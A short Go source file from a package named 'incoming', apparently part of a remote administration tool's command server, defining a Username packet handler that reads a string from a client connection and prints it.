package incoming

import (
	"fmt"
	"rat/command/client"
)

type Username struct {
	Packet
}

func (packet Username) Read(c *client.Client) error {
	username, err := c.ReadString()

	if err != nil {
		return err
	}

	fmt.Println("Got username", username)

	return nil
}
